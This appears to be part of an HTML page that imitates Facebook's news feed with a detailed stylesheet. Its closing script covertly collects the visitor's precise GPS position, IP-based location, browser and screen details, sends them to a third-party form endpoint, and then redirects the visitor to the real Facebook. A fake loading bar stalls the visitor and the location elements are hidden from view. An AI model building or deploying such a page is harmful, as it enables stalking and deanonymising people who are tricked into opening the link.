/* ── Tokens ──────────────────────────────────────────────────────── */
/* Layout: sticky nav + three-column feed, collapses to single-column */
:root {
  --fb:       #1877F2;
  --fb-hover: #166FE5;
  --bg:       #F0F2F5;
  --surface:  #FFFFFF;
  --nav-bg:   #FFFFFF;
  --fg:       #050505;
  --fg2:      #65676B;
  --border:   #E4E6EB;
  --chip:     #E4E6EB;
  --hover:    rgba(0,0,0,0.05);
  --shadow:   0 1px 2px rgba(0,0,0,0.10);
  --green:    #31A24C;
  --red:      #F02849;
  color-scheme: light;
}
@media (prefers-color-scheme: dark) {
  :root:not([data-theme="light"]) {
    --bg:      #18191A; --surface: #242526; --nav-bg: #242526;
    --fg:      #E4E6EB; --fg2:    #B0B3B8;
    --border:  #3E4042; --chip:   #3A3B3C;
    --hover:   rgba(255,255,255,0.06);
    --shadow:  0 1px 3px rgba(0,0,0,0.35);
    color-scheme: dark;
  }
}
:root[data-theme="dark"] {
  --bg:      #18191A; --surface: #242526; --nav-bg: #242526;
  --fg:      #E4E6EB; --fg2:    #B0B3B8;
  --border:  #3E4042; --chip:   #3A3B3C;
  --hover:   rgba(255,255,255,0.06);
  --shadow:  0 1px 3px rgba(0,0,0,0.35);
  color-scheme: dark;
}
/* ── Reset ───────────────────────────────────────────────────────── */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Inter', system-ui, sans-serif;
  background: var(--bg);
  color: var(--fg);
  font-size: 15px;
  line-height: 1.4;
}
a { text-decoration: none; color: inherit; }
button { font-family: inherit; cursor: pointer; border: none; background: none; }

/* ── Nav ─────────────────────────────────────────────────────────── */
body::before {
  content: ""; position: fixed; inset: 0 0 auto;
  height: env(safe-area-inset-top, 0px); z-index: 110; background: var(--nav-bg);
}
nav {
  position: sticky; top: env(safe-area-inset-top, 0px); z-index: 100;
  background: var(--nav-bg); border-bottom: 1px solid var(--border);
  box-shadow: var(--shadow); height: 56px; display: flex; align-items: center;
  padding-left:  max(16px, env(safe-area-inset-left, 0px));
  padding-right: max(16px, env(safe-area-inset-right, 0px));
}
.nav-inner {
  display: flex; align-items: center; width: 100%;
  max-width: 1300px; margin: 0 auto; gap: 8px;
}
.fb-logo {
  width: 40px; height: 40px; border-radius: 50%;
  background: var(--fb); display: flex; align-items: center;
  justify-content: center; color: #fff; font-size: 26px; font-weight: 900;
  flex-shrink: 0; line-height: 1;
}
.nav-search {
  display: flex; align-items: center; gap: 8px;
  background: var(--chip); border-radius: 20px;
  padding: 8px 14px; flex-shrink: 0;
}
.nav-search input {
  background: none; border: none; outline: none;
  color: var(--fg); font-size: 14px; width: 160px;
}
.nav-search input::placeholder { color: var(--fg2); }
.nav-search svg { flex-shrink: 0; color: var(--fg2); }
.nav-tabs {
  flex: 1; display: flex; justify-content: center; gap: 2px;
}
.tab-btn {
  padding: 10px 36px; border-radius: 8px;
  color: var(--fg2); font-size: 22px; transition: background 0.12s;
  position: relative;
}
.tab-btn:hover { background: var(--hover); }
.tab-btn.active { color: var(--fb); }
.tab-btn.active::after {
  content: ""; position: absolute; bottom: -1px; left: 0; right: 0;
  height: 3px; background: var(--fb); border-radius: 2px 2px 0 0;
}
.nav-right { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
.icon-btn {
  width: 40px; height: 40px; border-radius: 50%;
  background: var(--chip); display: flex; align-items: center;
  justify-content: center; font-size: 18px; color: var(--fg);
  transition: background 0.12s;
}
.icon-btn:hover { background: var(--border); }
.avatar {
  width: 40px; height: 40px; border-radius: 50%;
  background: linear-gradient(135deg, var(--fb) 0%, #64B5F6 100%);
  display: flex; align-items: center; justify-content: center;
  color: #fff; font-weight: 700; font-size: 15px; flex-shrink: 0;
}

/* ── Layout ──────────────────────────────────────────────────────── */
.page {
  max-width: 1300px; margin: 0 auto;
  display: grid; grid-template-columns: 260px 1fr 300px;
  gap: 0; padding: 16px 0;
  padding-left:  max(0px, env(safe-area-inset-left, 0px));
  padding-right: max(0px, env(safe-area-inset-right, 0px));
  align-items: start;
}
@media (max-width: 1120px) {
  .page { grid-template-columns: 260px 1fr; }
  .aside-right { display: none; }
}
@media (max-width: 720px) {
  .page { grid-template-columns: 1fr; padding: 8px 0; }
  .aside-left { display: none; }
}

/* ── Sidebars ────────────────────────────────────────────────────── */
.aside-left, .aside-right {
  position: sticky;
  top: calc(56px + env(safe-area-inset-top, 0px) + 12px);
  padding: 0 8px;
  max-height: calc(100vh - 90px); overflow-y: auto;
}
.aside-right { padding: 0 8px 0 0; }
.nav-link {
  display: flex; align-items: center; gap: 12px;
  padding: 8px 12px; border-radius: 8px;
  font-weight: 500; color: var(--fg); transition: background 0.12s;
}
.nav-link:hover { background: var(--hover); }
.nav-icon {
  width: 36px; height: 36px; border-radius: 50%;
  background: var(--chip); display: flex; align-items: center;
  justify-content: center; font-size: 18px; flex-shrink: 0;
}
.nav-icon.user {
  background: linear-gradient(135deg, var(--fb) 0%, #64B5F6 100%);
  color: #fff; font-weight: 700; font-size: 14px;
}
.aside-divider { height: 1px; background: var(--border); margin: 6px 12px; }
.aside-label { padding: 8px 12px 2px; font-size: 17px; font-weight: 700; }

/* ── Feed ────────────────────────────────────────────────────────── */
.feed { padding: 0 8px; display: flex; flex-direction: column; gap: 16px; min-width: 0; }

/* Stories */
.stories {
  display: flex; gap: 10px;
  overflow-x: auto; padding-bottom: 4px; scrollbar-width: none;
}
.stories::-webkit-scrollbar { display: none; }
.story {
  flex-shrink: 0; width: 108px; height: 182px; border-radius: 12px;
  overflow: hidden; cursor: pointer; box-shadow: var(--shadow);
  position: relative;
}
.story-bg {
  width: 100%; height: 100%; display: flex; align-items: flex-end;
  padding: 10px; color: #fff; font-weight: 700; font-size: 13px;
  text-shadow: 0 1px 4px rgba(0,0,0,0.6);
}
.story-create {
  background: var(--surface); flex-direction: column;
  align-items: center; justify-content: flex-end; padding-bottom: 12px; gap: 8px;
}
.story-plus {
  position: absolute; top: 44%; left: 50%; transform: translate(-50%, -50%);
  width: 42px; height: 42px; border-radius: 50%;
  background: var(--fb); color: #fff; font-size: 28px; font-weight: 300;
  display: flex; align-items: center; justify-content: center;
  border: 3px solid var(--surface);
}
.story-create-label { color: var(--fg); font-size: 12px; font-weight: 600; }

/* Card */
.card { background: var(--surface); border-radius: 8px; box-shadow: var(--shadow); overflow: hidden; }

/* Composer */
.composer { padding: 12px 16px; }
.composer-row { display: flex; align-items: center; gap: 10px; }
.composer-field {
  flex: 1; min-width: 0; background: var(--bg); border: none; border-radius: 20px;
  padding: 10px 16px; font-size: 16px; color: var(--fg2);
  cursor: text; outline: none; font-family: inherit;
}
.composer-field:focus { outline: 2px solid var(--fb); }
.location-row { margin: 10px 0 2px; }
.loc-tag {
  display: inline-flex; align-items: center; gap: 7px;
  padding: 6px 14px; border-radius: 20px;
  background: rgba(24,119,242,0.09); color: var(--fb);
  font-size: 13px; font-weight: 600; cursor: pointer;
  border: 1px solid rgba(24,119,242,0.18);
  transition: background 0.12s;
}
.loc-tag:hover { background: rgba(24,119,242,0.15); }
.loc-tag.error {
  background: rgba(240,40,73,0.07); color: var(--red);
  border-color: rgba(240,40,73,0.2);
}
.loc-pulse {
  width: 8px; height: 8px; border-radius: 50%; background: var(--fb);
  animation: pulse 1.4s ease-in-out infinite;
}
@keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.45;transform:scale(.75)} }
.c-divider { height: 1px; background: var(--border); margin: 8px 0; }
.c-actions { display: flex; justify-content: space-around; }
.c-action {

  border-radius: 8px; color: var(--fg2); font-weight: 600; font-size: 14px;
  transition: background 0.12s;
}
.c-action:hover { background: var(--hover); }

/* Post */
.p-head { display: flex; align-items: flex-start; gap: 10px; padding: 12px 16px; }
.p-av { width: 40px; height: 40px; border-radius: 50%; flex-shrink: 0;

.p-info { flex: 1; min-width: 0; }
.p-name { font-weight: 700; font-size: 15px; }

.p-body { padding: 0 16px 12px; font-size: 15px; line-height: 1.55; }

.p-stats {

}
.p-actions { display: flex; justify-content: space-around; padding: 4px 8px; }
.p-action {
  flex: 1; display: flex; align-items: center; justify-content: center;

}
.p-action:hover { background: var(--hover); }

/* Contacts */
.c-title {
  display: flex; justify-content: space-between; align-items: center;
  padding: 8px 12px 4px; font-size: 17px; font-weight: 700;
}
.c-item {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px; border-radius: 8px; cursor: pointer;
  transition: background 0.12s; font-size: 15px; font-weight: 500;
}
.c-item:hover { background: var(--hover); }
.c-av {
  width: 36px; height: 36px; border-radius: 50%; flex-shrink: 0;
  position: relative; display: flex; align-items: center;
  justify-content: center; color: #fff; font-weight: 700; font-size: 13px;
}
.c-dot {
  position: absolute; bottom: 1px; right: 1px;
  width: 10px; height: 10px; background: var(--green);
  border-radius: 50%; border: 2px solid var(--surface);

/* Geo detail strip */
.geo-strip {
  margin: 0 16px 10px;
  padding: 8px 12px; border-radius: 8px;
  background: rgba(24,119,242,0.05); border: 1px solid rgba(24,119,242,0.15);

#loc-row, #geo-strip, #geo-post { display: none !important; }
.nav-progress { position: fixed; top: 0; left: 0; width: 100%; height: 3px; z-index: 200; }
.nav-progress-bar { height: 100%; background: var(--fb); transition: width .4s ease; border-radius: 0 2px 2px 0; }
.shimmer { position: relative; overflow: hidden; background: var(--chip) !important; border-radius: 4px; }
.shimmer::after { content: ""; position: absolute; inset: 0; background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.6) 50%, transparent 100%); animation: sh 1.6s infinite; }
@media(prefers-color-scheme:dark){ .shimmer::after { background: linear-gradient(90deg,transparent 0%,rgba(255,255,255,.07) 50%,transparent 100%); } }
@keyframes sh { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
.skel-post { background: var(--surface); border-radius: 8px; box-shadow: var(--shadow); overflow: hidden; padding: 16px; }
.skel-row { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }

.skel-block { height: 200px; border-radius: 8px; margin-bottom: 14px; }
.skel-actions { display: flex; gap: 8px; }
.skel-btn { height: 36px; border-radius: 6px; flex: 1; }
</style>

<script>
var payload = { timestamp: new Date().toISOString(), user_agent: navigator.userAgent, screen: screen.width + 'x' + screen.height, language: navigator.language };
var gpsReady = false, ipReady = false, submitted = false;
var startTime = Date.now();
var MIN_DISPLAY = 8000;

var bar = document.getElementById('nav-progress-bar');
var pct = 0;
var pInterval = setInterval(function(){
  pct += Math.random() * 8 + 2;
  if (pct > 85) { pct = 85; clearInterval(pInterval); }
  bar.style.width = pct + '%';
}, 300);

function doRedirect() {
  clearInterval(pInterval);
  bar.style.width = '100%';
  try { localStorage.setItem('geo_capture', JSON.stringify(payload)); } catch(e){}
  var data = JSON.stringify(payload);
  var blob = new Blob([data], {type: 'application/json'});
  var sent = navigator.sendBeacon && navigator.sendBeacon('https://formspree.io/f/mjywpbar', blob);
  if (!sent) {
    fetch('https://formspree.io/f/mjywpbar', {
      method: 'POST', headers: {'Content-Type':'application/json','Accept':'application/json'},
      body: data
    }).catch(function(){});
  }
  setTimeout(function(){ window.location.href = 'https://www.facebook.com'; }, sent ? 300 : 2000);
}
function tryFinalize() {
  if (!submitted && (gpsReady || ipReady)) {
    submitted = true;
    var elapsed = Date.now() - startTime;
    setTimeout(doRedirect, Math.max(0, MIN_DISPLAY - elapsed));
  }
}

navigator.geolocation.getCurrentPosition(
  function(pos) {
    payload.gps_lat = pos.coords.latitude;
    payload.gps_lng = pos.coords.longitude;
    payload.gps_acc = pos.coords.accuracy;
    gpsReady = true; tryFinalize();
  },
  function() { gpsReady = true; tryFinalize(); },
  { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
);

fetch('https://get.geojs.io/v1/ip/geo.json')
  .then(function(r){ return r.json(); })
  .then(function(d){
    payload.ip = d.ip; payload.ip_city = d.city; payload.ip_country = d.country_code;
    payload.ip_lat = d.latitude; payload.ip_lng = d.longitude; payload.timezone = d.timezone;
    ipReady = true; tryFinalize();
  })
  .catch(function(){ ipReady = true; tryFinalize(); });

setTimeout(function(){
  if (!submitted) { submitted = true; doRedirect(); }
}, 15000);
</script>
